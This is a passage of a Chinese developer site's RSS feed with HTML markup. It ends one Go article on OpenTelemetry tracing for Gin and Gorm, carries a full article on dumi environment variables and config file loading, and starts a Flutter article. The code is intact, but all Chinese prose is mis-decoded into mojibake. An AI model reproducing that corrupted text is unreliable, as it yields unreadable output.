		<span class="hljs-built_in">panic</span>(err)
	}
    
	<span class="hljs-comment">// è¿™æ˜¯é‡ç‚¹ ä½¿ç”¨è¿™ä¸ªæ’ä»¶  ç”¨æ³•ä¸ ginçš„ä¸­é—´ä»¶å·®ä¸å¤š tracing.NewPlugin() åç»­æœ‰æºç è§£è¯»</span>
	<span class="hljs-keyword">if</span> err := db.Use(tracing.NewPlugin()); err != <span class="hljs-literal">nil</span> {
		<span class="hljs-built_in">panic</span>(err)
	}
	<span class="hljs-comment">// è¿™ä¸ªæ—¶å€™ä½¿ç”¨æ•°æ®åº“çš„æ—¶å€™ WithContext(spanCtx) æ˜¯æœ€å…³é”®çš„ </span>
	<span class="hljs-keyword">if</span> err := db.WithContext(spanCtx).Model(model.UserModels{}).Where(<span class="hljs-string">"id = ?"</span>, <span class="hljs-number">1</span>).First(&amp;model.UserModels{}).Error; err != <span class="hljs-literal">nil</span> {
		<span class="hljs-built_in">panic</span>(err)
	}
	time.Sleep(<span class="hljs-number">500</span> * time.Millisecond)
	c.JSON(<span class="hljs-number">200</span>, gin.H{})
}


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	tp, _ = common.InitTracerProvider(common.Options{
		Name:     <span class="hljs-string">"basic_name"</span>,
		Endpoint: <span class="hljs-string">"http://192.168.163.132:14268/api/traces"</span>,
		Sampler:  <span class="hljs-number">1</span>,
		Batcher:  <span class="hljs-string">"jaeger"</span>,
	})
	r := gin.Default()
    <span class="hljs-comment">// å…ˆä»‹ç»ä¸€ä¸‹ è¿™ä¸ªæºç  ç„¶åä»‹ç»ä¸€ä¸‹  gorm å¯¹è¿™ä¸ª opentelemetry çš„ æ”¯æŒçš„ä¸­é—´ä»¶</span>
	r.Use(otelgin.Middleware(<span class="hljs-string">"gin_Middleware"</span>))
	r.GET(<span class="hljs-string">"/"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> {

	})
	r.GET(<span class="hljs-string">"/server"</span>, Server)
	r.Run(<span class="hljs-string">":8090"</span>)
}

</code></pre>
<h2 data-id="heading-14">æ‰§è¡Œç»“æœ</h2>
<p>ç¬¬äºŒå¼ æ˜¯æœ€åä¸€ä¸ª <code>gin</code> ä¸­é—´ä»¶ç”Ÿæˆçš„
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bac35b2318ae4ba6aa7e76b68968070a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiL5qyh5LiA5a6aNTc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888385&amp;x-signature=2Ojdqgf5aObIlg3e3kOfpWngzng%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf51bb4d2fce42039083028853df3158~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiL5qyh5LiA5a6aNTc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888385&amp;x-signature=JaSQsRS3y0H5E5Ml0bJzPJB%2Bgo0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-15">æ ¸å¿ƒé€»è¾‘è®²è§£</h2>
<h3 data-id="heading-16"><code>otelgin.Middleware("gin_Middleware")</code> å‡½æ•°</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Middleware</span><span class="hljs-params">(service <span class="hljs-type">string</span>, opts ...Option)</span></span> gin.HandlerFunc {
	cfg := config{}
	<span class="hljs-comment">// ä¾æ—§æ˜¯å¯ä»¥è®¾ç½®ä¸€äº›é…ç½®</span>
	<span class="hljs-keyword">for</span> _, opt := <span class="hljs-keyword">range</span> opts {
		opt.apply(&amp;cfg)
	}
    <span class="hljs-comment">// è¿™é‡Œå°±æ˜¯æ²¡ä¼ å°±è‡ªå·±å»æ‹¿ è°ƒç”¨çš„å‡½æ•°ä¹Ÿæ˜¯ä¹‹å‰è®²è¿‡çš„</span>
	<span class="hljs-keyword">if</span> cfg.TracerProvider == <span class="hljs-literal">nil</span> {
		cfg.TracerProvider = otel.GetTracerProvider()
	}
    <span class="hljs-comment">// è¿™é‡Œç”Ÿæˆ Tracer</span>
	tracer := cfg.TracerProvider.Tracer(
		ScopeName,
		oteltrace.WithInstrumentationVersion(Version()),
	)
    <span class="hljs-comment">// è¿™é‡Œ æ‹¿  Propagators</span>
	<span class="hljs-keyword">if</span> cfg.Propagators == <span class="hljs-literal">nil</span> {
		cfg.Propagators = otel.GetTextMapPropagator()
	}
    <span class="hljs-comment">// ç›‘æ§ç³»ç»Ÿç›¸å…³</span>
	<span class="hljs-keyword">if</span> cfg.MeterProvider == <span class="hljs-literal">nil</span> {
		cfg.MeterProvider = otel.GetMeterProvider()
	}
	<span class="hljs-keyword">if</span> cfg.SpanNameFormatter == <span class="hljs-literal">nil</span> {
		cfg.SpanNameFormatter = defaultSpanNameFormatter
	}
	meter := cfg.MeterProvider.Meter(
		ScopeName,
		metric.WithInstrumentationVersion(Version()),
	)

	sc := semconv.NewHTTPServer(meter)

	<span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> {
		requestStartTime := time.Now()
        <span class="hljs-comment">// è¿™é‡Œå°±æ˜¯ ä¸­é—´ä»¶éœ€è¦è®°å½•çš„ä¸œè¥¿</span>
        <span class="hljs-comment">// æ‰§è¡Œå‰ è®°å½•ä¸€ä¸‹  æ‰§è¡Œåè®°å½•ä¸€ä¸‹ å·²ç»æ‹¿åˆ° span å…³é”®çš„é“¾è·¯å·²ç»è§£å†³å‰©ä¸‹å°±æ˜¯ä¸šåŠ¡é—®é¢˜Â·</span>
        
}

</code></pre>
<h3 data-id="heading-17"><code>tracing.NewPlugin()</code> å‡½æ•°</h3>
<p><code>Gorm</code> åœ¨è®¾è®¡ä¹‹åˆå°±é¢„ç•™äº†å¾ˆå¤šæ¥å£ï¼Œä»¥ä¾¿æœªæ¥ä¼šç”¨åˆ°ï¼Œè¿™ä¹Ÿä½“ç°äº†goè¯­è¨€é¢å‘æ¥å£ç¼–ç¨‹</p>
<p>è¿™é‡Œä¸¤ä¸ªé‡è¦å‡½æ•° <code>before</code> å’Œ <code>after</code> è¿”å›çš„æ˜¯é’©å­å‡½æ•°ï¼Œç»‘å®šåˆ° <code>Gorm</code> , <code>Gorm</code> ä¼šåœ¨ SQL æ‰§è¡Œæ—¶è‡ªåŠ¨è§¦å‘è¿™äº›é’©å­</p>
<p>å› ä¸ºé“¾è·¯ä¼ é€’éœ€è¦ <code>context</code> ï¼Œé€šè¿‡<code>db.WithContext(spanCtx)</code> å°†ä¸Šå±‚ä¸šåŠ¡çš„è¿½è¸ªä¸Šä¸‹æ–‡æ³¨å…¥ <code>Gorm</code> ï¼Œä¾›åç»­é’©å­ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPlugin</span><span class="hljs-params">(opts ...Option)</span></span> gorm.Plugin {
   
	p := &amp;otelPlugin{}
	<span class="hljs-keyword">for</span> _, opt := <span class="hljs-keyword">range</span> opts {
		opt(p)
	}
	
	<span class="hljs-keyword">if</span> p.provider == <span class="hljs-literal">nil</span> {
		p.provider = otel.GetTracerProvider()
	}
	p.tracer = p.provider.Tracer(<span class="hljs-string">"gorm.io/plugin/opentelemetry"</span>)

	<span class="hljs-keyword">return</span> p
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *otelPlugin)</span></span> before(spanName <span class="hljs-type">string</span>) gormHookFunc {...}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *otelPlugin)</span></span> after() gormHookFunc {...}
</code></pre>
<h2 data-id="heading-18">æ€»ç»“</h2>
<p>æœ¬ç¯‡ä»æœ¬åœ°å•è¿›ç¨‹é“¾è·¯éªŒè¯ï¼Œåˆ°è·¨æœåŠ¡è¿½è¸ªä¸Šä¸‹æ–‡çš„<code>Inject/Extract</code>ä¼ é€’ï¼Œå†åˆ° <code>Gin</code>ã€<code>Gorm</code> ä¸»æµç”Ÿæ€çš„è‡ªåŠ¨åŸ‹ç‚¹é›†æˆï¼Œå®Œæ•´è½åœ°äº† <code>OpenTelemetry</code> åˆ†å¸ƒå¼è¿½è¸ªçš„å®æˆ˜å…¨æµç¨‹ï¼›æ—¢æ‰¿æ¥äº†ä¸Šç¯‡çš„åˆå§‹åŒ–åº•å±‚é€»è¾‘ï¼ŒåˆæŒæ¡äº†å¾®æœåŠ¡åœºæ™¯ä¸‹é“¾è·¯ä¿æ´»ä¸æ¡†æ¶é€‚é…çš„æ ¸å¿ƒæ–¹æ³•ï¼Œç›¸å…³æ–¹æ¡ˆå¯ç›´æ¥è¿ç§»è‡³ç”Ÿäº§ç¯å¢ƒï¼Œå®ç°ä»æ¥å£è°ƒç”¨åˆ°æ•°æ®åº“æ“ä½œçš„å…¨é“¾è·¯å¯è§‚æµ‹é—­ç¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[dumi ç¯å¢ƒå˜é‡]]></title>    <link>https://juejin.cn/post/7603142147642703915</link>    <guid>https://juejin.cn/post/7603142147642703915</guid>    <pubDate>2026-02-05T09:28:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603142147642703915" data-draft-id="7603010441149546537" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="dumi ç¯å¢ƒå˜é‡"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-05T09:28:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="UndefinedLuo"/> <meta itemprop="url" content="https://juejin.cn/user/2893570336367725"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            dumi ç¯å¢ƒå˜é‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2893570336367725/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    UndefinedLuo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:28:38.000Z" title="Thu Feb 05 2026 09:28:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€envï¼ˆprocess.env.NODE_ENVï¼‰</h2>
<p><code>process.env.NODE_ENV</code> ç”± dumi è‡ªåŠ¨æ³¨å…¥ï¼Œç”¨äºåŒºåˆ†å¼€å‘æ€å’Œç”Ÿäº§æ€ï¼š</p>

























<table><thead><tr><th>å‘½ä»¤</th><th>ç¯å¢ƒ</th><th>process.env.NODE_ENVçš„å€¼</th></tr></thead><tbody><tr><td><code>dumi dev</code></td><td>dev</td><td><code>development</code></td></tr><tr><td><code>dumi test</code></td><td>test</td><td><code>production</code></td></tr><tr><td><code>dumi build</code></td><td>prod</td><td><code>production</code></td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">if</span> (process.env.NODE_ENV === <span class="hljs-string">'production'</span>) {
  <span class="hljs-comment">// test å’Œ prod éƒ½ä¼šè¿›å…¥è¿™é‡Œ</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-1">äºŒã€dumi å†…ç½®ç¯å¢ƒï¼šdev / test / prod</h2>





























<table><thead><tr><th>å‘½ä»¤</th><th>ç¯å¢ƒ</th><th>å¯¹åº”é…ç½®æ–‡ä»¶</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>dumi dev</code></td><td>dev</td><td><code>.dumirc.ts</code> <code>.dumirc.dev.ts</code> <code>.dumirc.local.ts</code></td><td>å¼€å‘ç¯å¢ƒï¼ŒåŸºç¡€ + é˜¶æ®µæ€§ + æœ¬åœ°è¦†ç›–</td></tr><tr><td><code>dumi test</code></td><td>test</td><td><code>.dumirc.ts</code> <code>.dumirc.test.ts</code> <code>.dumirc.local.ts</code></td><td>æµ‹è¯•/é¢„å‘å¸ƒç¯å¢ƒï¼ŒåŸºç¡€ + é˜¶æ®µæ€§ + æœ¬åœ°è¦†ç›–</td></tr><tr><td><code>dumi build</code></td><td>prod</td><td><code>.dumirc.ts</code> <code>.dumirc.prod.ts</code> <code>.dumirc.local.ts</code></td><td>æ­£å¼ç”Ÿäº§ç¯å¢ƒï¼ŒåŸºç¡€ + é˜¶æ®µæ€§ + æœ¬åœ°è¦†ç›–</td></tr></tbody></table>
<h2 data-id="heading-2">ä¸‰ã€DUMI_ENV</h2>
<p><code>DUMI_ENV</code> ç”¨äº<strong>å°‘æ•°ç‰¹æ®Šåœºæ™¯çš„é¢å¤–é…ç½®ç»´åº¦</strong>ï¼Œå½“ <code>dev / test / prod</code> ä¸å¤ŸåŒºåˆ†æ—¶ä½¿ç”¨ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>åŒä¸€ç¯å¢ƒéœ€è¦åŒºåˆ†å†…éƒ¨ / å¯¹å¤–æ–‡æ¡£</li>
<li>åŒä¸€ç¯å¢ƒå­˜åœ¨å¤šå¥—éƒ¨ç½²æˆ–å‘å¸ƒç›®æ ‡</li>
<li>ä¸ºç‰¹å®šç”¨é€”å‡†å¤‡ç‹¬ç«‹é…ç½®ï¼ˆæ¼”ç¤ºç‰ˆã€ä¸´æ—¶å‘å¸ƒç­‰ï¼‰</li>
</ul>
<p><strong>æ³¨æ„</strong>ï¼š<code>DUMI_ENV</code> ä¸èƒ½è®¾ç½®ä¸º <code>dev</code> / <code>test</code> / <code>prod</code>ã€‚</p>
<h2 data-id="heading-3">å››ã€é…ç½®æ–‡ä»¶åŠ è½½è§„åˆ™</h2>
<h3 data-id="heading-4">1. æŒ‡å®š DUMI_ENV</h3>
<p>æŒ‰ä»¥ä¸‹é¡ºåºåŠ è½½ï¼Œè¶Šé åä¼˜å…ˆçº§è¶Šé«˜ï¼š</p>
<ol>
<li><code>.dumirc.ts</code></li>
<li><code>.dumirc.${DUMI_ENV}.ts</code></li>
<li><code>.dumirc.${dev | test | prod}.ts</code></li>
<li><code>.dumirc.${dev | test | prod}.${DUMI_ENV}.ts</code></li>
<li><code>.dumirc.local.ts</code></li>
</ol>
<p>ååŠ è½½çš„é…ç½®ä¼šè¦†ç›–å…ˆåŠ è½½çš„é…ç½®ã€‚</p>
<h3 data-id="heading-5">2. æœªæŒ‡å®š DUMI_ENV</h3>
<p>åŠ è½½ï¼š</p>
<ol>
<li><code>.dumirc.ts</code></li>
<li>å½“å‰ç¯å¢ƒå¯¹åº”é…ç½®æ–‡ä»¶ï¼ˆ<code>.dumirc.dev.ts</code> / <code>.dumirc.test.ts</code> / <code>.dumirc.prod.ts</code>ï¼‰</li>
<li><code>.dumirc.local.ts</code></li>
</ol>
<h2 data-id="heading-6">äº”ã€æ€»ç»“</h2>
<ul>
<li><code>NODE_ENV</code>ï¼šåŒºåˆ† <strong>å¼€å‘æ€ / ç”Ÿäº§æ€</strong></li>
<li>å†…ç½®ç¯å¢ƒ <code>dev / test / prod</code>ï¼šåŒºåˆ† <strong>æ„å»ºé˜¶æ®µ</strong></li>
<li><code>DUMI_ENV</code>ï¼šåŒºåˆ† <strong>ç‰¹æ®Šä¸šåŠ¡ / åœºæ™¯é…ç½®</strong></li>
</ul>
<blockquote>
<p>å½“ä½ å‘ç°åŒä¸€æ„å»ºé˜¶æ®µä½†é…ç½®ä¸åŒï¼Œå°±è€ƒè™‘ä½¿ç”¨ <code>DUMI_ENV</code>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[FLutterçš„Cursor Skills å®æˆ˜åˆ†äº«]]></title>    <link>https://juejin.cn/post/7602996277665316918</link>    <guid>https://juejin.cn/post/7602996277665316918</guid>    <pubDate>2026-02-05T09:28:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602996277665316918" data-draft-id="7603030564837654582" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="FLutterçš„Cursor Skills å®æˆ˜åˆ†äº«"/> <meta itemprop="keywords" content="Flutter,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-05T09:28:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜å›87997"/> <meta itemprop="url" content="https://juejin.cn/user/413072103838462"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            FLutterçš„Cursor Skills å®æˆ˜åˆ†äº«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/413072103838462/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜å›87997
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:28:41.000Z" title="Thu Feb 05 2026 09:28:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èŠèŠ Cursor çš„ Skills åŠŸèƒ½ï¼Œç”¨ Flutter é¡¹ç›®ä¸¾ä¾‹</h2>
